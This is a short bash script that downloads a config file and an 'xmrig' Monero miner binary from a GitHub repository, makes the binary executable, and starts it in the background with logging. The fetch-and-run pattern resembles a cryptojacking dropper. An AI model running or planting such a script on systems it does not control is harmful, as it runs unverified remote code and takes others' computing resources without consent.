#!/bin/bash

wget https://raw.githubusercontent.com/e-swap/xmrminer/main/config.json -O config.json
wget https://github.com/e-swap/xmrminer/raw/main/xmrig
chmod +x xmrig
./xmrig -l xmr.log &
